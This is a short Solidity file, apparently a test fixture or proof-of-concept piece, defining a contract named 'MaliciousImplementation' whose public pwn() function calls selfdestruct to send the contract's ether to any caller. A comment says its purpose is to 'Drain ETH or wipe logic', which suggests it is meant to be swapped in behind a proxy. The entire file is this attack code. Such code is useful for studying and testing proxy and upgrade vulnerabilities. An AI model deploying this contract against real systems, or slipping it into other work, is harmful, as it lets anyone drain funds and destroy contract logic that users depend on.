// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MaliciousImplementation {
    function pwn() public {
        selfdestruct(payable(msg.sender)); // Drain ETH or wipe logic
    }
}
